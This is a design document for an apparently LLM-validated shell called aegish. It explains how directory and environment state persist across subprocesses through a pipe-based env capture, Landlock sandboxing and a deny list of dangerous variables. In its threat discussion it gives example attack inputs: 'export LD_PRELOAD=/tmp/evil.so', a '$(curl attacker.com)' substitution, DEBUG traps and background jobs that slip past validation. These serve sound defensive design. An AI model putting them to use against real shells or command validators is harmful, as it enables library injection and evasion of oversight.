# Shell State Persistence

## Problem

aegish executes each command via `subprocess.run(["bash", "-c", command])`, spawning a fresh subprocess per command. All shell state (working directory, environment variables) is lost between commands:

- `cd ..` changes the directory inside the ephemeral subprocess, but the parent Python process's cwd is unchanged. The next command starts in the original directory.
- `export FOO=bar` sets a variable inside the subprocess, which is destroyed on exit.

This breaks fundamental user expectations for an interactive shell.

## Chosen Approach: Python-Tracked State

Track `cwd` and `env` as Python-side data structures. Intercept bare `cd` as a fast path; pass `cwd=` and `env=` to every `subprocess.run` call. After each command, read the subprocess environment back through an anonymous pipe.

```
current_dir = os.getcwd()
env = _build_safe_env()

# each iteration:
if is_bare_cd(cmd):
    current_dir = resolve(target, current_dir)
else:
    env_r, env_w = os.pipe()
    suffix = f'; __aegish_rc=$?; env -0 >&{env_w}; exit $__aegish_rc'
    result = subprocess.run(
        ["bash", "-c", cmd + suffix],
        cwd=current_dir,
        env=env,
        pass_fds=(env_w,),
    )
    os.close(env_w)
    raw = os.read(env_r, MAX_ENV_SIZE)
    os.close(env_r)
    env = sanitize_env(parse_nul_delimited(raw))
    current_dir = env.get("PWD", current_dir)
```

### What persists

- **Working directory** (`cd`, `cd -`, `cd ~`, `cd` with no args)
- **Exported environment variables** (`export FOO=bar`)
- **`$?`** (already implemented via `last_exit_code`)

### What does not persist

- Local (non-exported) shell variables (`FOO=bar` without `export`)
- Shell functions and aliases
- `source` / `.` side effects
- Trap definitions

This is an acceptable tradeoff. Users who need variable persistence can use `export`. The non-persisting features (functions, aliases, traps) are exactly the ones that pose security risks if carried across validation boundaries.

### Capturing env changes

After each command, the subprocess environment is read back into the Python dict through an **anonymous pipe**:

1. Python creates a pipe: `env_r, env_w = os.pipe()`
2. `env_w` is kept open in the child via `pass_fds=(env_w,)`
3. A suffix is appended to the command string: `; __aegish_rc=$?; env -0 >&{env_w}; exit $__aegish_rc`
4. After the subprocess exits, Python reads NUL-delimited output from `env_r` and parses it into a dict

The suffix preserves the user command's exit code (`__aegish_rc=$?`) and restores it (`exit $__aegish_rc`) so that `$?` reflects the user's command, not `env`.

`env -0` produces NUL-delimited output (`KEY=VALUE\0`), which correctly handles env values containing newlines.

**Why a pipe instead of a temp file:**

- **No race condition.** Anonymous pipes have no filesystem path. Nothing can intercept, replace, or symlink-attack them.
- **No cleanup.** Both FDs are closed after use. No temp file to delete, no failure mode where stale files accumulate.
- **Landlock-invisible.** Landlock restricts path-based filesystem operations. An anonymous pipe has no path, so it works identically whether or not a Landlock sandbox is active. A temp file at `/tmp/...` would need to be in the Landlock write allowlist.
- **No stdout corruption.** The env output goes to a dedicated FD, not stdout. The user's command output is unaffected.

### Environment sanitization

The captured env dict is sanitized **on every capture cycle**, not just at startup. Without this, a command like `export LD_PRELOAD=/tmp/evil.so` would propagate the variable to all subsequent commands.

```
DANGEROUS_ENV_VARS = frozenset({
    # Already filtered at startup (executor.py):
    "BASH_ENV", "ENV", "PROMPT_COMMAND",
    "EDITOR", "VISUAL", "PAGER", "GIT_PAGER", "MANPAGER",
    # Added for per-cycle sanitization:
    "LD_PRELOAD", "LD_LIBRARY_PATH", "LD_AUDIT",
    "SHELLOPTS", "BASHOPTS",
    "CDPATH",
})

def sanitize_env(captured: dict) -> dict:
    return {
        k: v for k, v in captured.items()
        if k not in DANGEROUS_ENV_VARS
        and not k.startswith("BASH_FUNC_")
    }
```

Newly added variables and rationale:

| Variable | Risk |
|---|---|
| `LD_PRELOAD`, `LD_LIBRARY_PATH`, `LD_AUDIT` | Inject shared libraries into every subsequent process |
| `SHELLOPTS`, `BASHOPTS` | Change bash parsing/execution behavior across commands |
| `CDPATH` | Causes bash `cd` resolution to diverge from Python-side resolution |

When a dangerous variable is stripped, a debug-level log message is emitted so the behavior is not silently surprising.

### Handling `cd`

**Fast path — bare `cd` commands:**

Bare `cd` is intercepted in Python to avoid spawning a subprocess for a directory change.

| Input | Resolution |
|---|---|
| `cd /absolute/path` | Use directly |
| `cd relative` | Resolve against `current_dir` |
| `cd ~` or `cd` | Expand to `$HOME` |
| `cd -` | Swap with `previous_dir` (track `OLDPWD`) |
| `cd ~user` | Expand via `os.path.expanduser()` |
| `pushd` / `popd` | Intercept as builtins with a directory stack |

After resolving, validate that the target exists and is a directory. Update `current_dir` and set `PWD`/`OLDPWD` in the env dict.

**General path — compound commands containing `cd`:**

Commands like `cd /tmp && ls` or `if test -d /opt; then cd /opt; fi` are not intercepted. They run in the subprocess normally, and `PWD` is read from the captured env afterward:

```
new_env = sanitize_env(parse_nul_delimited(raw))
new_pwd = new_env.get("PWD", current_dir)
if os.path.isdir(new_pwd):
    previous_dir = current_dir
    current_dir = new_pwd
```

This means `cd` interception is a **fast path** (skip subprocess for simple cases), not the **only path**. Compound commands with embedded `cd` just work.

`CDPATH` is stripped by `sanitize_env()` to prevent divergence between Python-side resolution (fast path) and bash-side resolution (general path).

### Landlock integration

The pipe-based env capture is compatible with the existing two-layer Landlock sandbox (see `landlock-dropper-implementation.md`).

**Pipes are invisible to Landlock.** Landlock restricts path-based filesystem operations (`open`, `execve` on paths). `os.pipe()` creates kernel-level FDs with no filesystem path. `write(fd, ...)` on a pipe is not a path-based operation, so neither Landlock layer can block it.

**Sudo commands skip env capture.** When a sysadmin user runs a `sudo` command in production mode, the executor uses a separate path (`_execute_sudo_sandboxed`) that does not create an env capture pipe. The original env and cwd are returned unchanged. This is a known limitation — sudo commands cannot update the shell's environment state.

**`pass_fds` must include both the Landlock ruleset FD and the pipe FD.** CPython's `subprocess.run` defaults to `close_fds=True`, which closes all FDs not in `pass_fds`. Both FDs must be listed:

```
sandbox_kwargs = _sandbox_kwargs()              # {"preexec_fn": ..., "pass_fds": (ruleset_fd,)}
existing_fds = sandbox_kwargs.pop("pass_fds", ())
sandbox_kwargs["pass_fds"] = existing_fds + (env_write_fd,)
```

**`/usr/bin/env` must remain in the Landlock allowlist.** The `env -0` suffix executes `/usr/bin/env` via `execve()`. Both layers allow it (not a shell, not the runner). If `env` is ever restricted, a bash-builtin fallback is possible:

```
# No execve — uses only bash builtins:
for __v in $(compgen -e); do printf '%s=%s\0' "$__v" "${!__v}"; done >&{env_w}
```

**Execution order with the dropper prefix.** In production mode, the full command string is:

```
(exit N); /opt/aegish/bin/dropper /opt/aegish/bin/runner && USER_CMD; __aegish_rc=$?; env -0 >&FD; exit $__aegish_rc
```

Sequence:
1. `(exit N)` — sets `$?` to previous exit code
2. `dropper` — activates Landlock Layer B (denies runner)
3. `&& USER_CMD` — runs under Layer A ∩ B
4. `env -0 >&FD` — captures env to pipe; `/usr/bin/env` is allowed by both layers
5. `exit $__aegish_rc` — propagates the user command's exit code

The dropper activates Layer B before the user command, and the env capture runs after the user command. The `&&` between the dropper and user command is fail-safe: if the dropper fails, nothing else executes.

## Alternatives Considered

### Persistent PTY (pexpect)

Maintain a single long-lived bash subprocess and send commands to it via a pseudo-terminal. All state persists naturally.

**Rejected because it weakens the security model:**

- **Traps execute unvalidated.** `trap 'payload' DEBUG` runs before every subsequent command without passing through LLM validation.
- **Background jobs escape validation.** `(sleep 60 && malicious_cmd) &` runs autonomously inside the persistent shell.
- **Aliases/functions wrap validated commands.** A harmless-looking alias definition can inject payloads into every future invocation of a common command.
- **`DANGEROUS_ENV_VARS` can be re-set.** The user can set `PROMPT_COMMAND` or `BASH_ENV` inside the persistent shell, bypassing the startup filter.
- **Landlock cannot be per-command.** The sandbox is applied once at startup; all commands share the same permissions.
- **Complex output/signal handling.** Detecting command boundaries in PTY output, forwarding Ctrl+C to the correct foreground process, and handling interactive programs (vim, less) all add significant complexity.

### State Dump/Restore Wrapper

Wrap each command in a script that `source`s a state file before running and `declare -p`s to it after.

**Rejected because state restoration is code execution:**

- **The state file is an injection vector.** It is `source`d (executed as bash code) before each command. A malicious command that passes validation could append arbitrary code to the file, which then runs unvalidated before the next command.
- **`declare -p` output can contain command substitutions.** Variable values like `$(curl attacker.com)` execute when the state file is sourced.
- **Predictable file path enables symlink/race attacks.** An attacker could replace the state file between dump and restore.
- **Functions and aliases persist.** Same wrapping attacks as the PTY approach, just serialized to disk.

### Why Python-tracked state is safer

The env dict is passed to `subprocess.run(env=...)` as **data, not code**. There is no `source` step, no bash interpretation of the state. The `DANGEROUS_ENV_VARS` filter is applied programmatically on every capture cycle by deleting keys from a dict — it cannot be bypassed from inside a subprocess, and re-exporting a dangerous variable in one command does not propagate it to the next. Each subprocess is fresh, so traps, background jobs, aliases, and functions cannot survive across commands. The pipe-based env capture introduces no new filesystem paths, so per-command Landlock sandboxing continues to work unchanged.
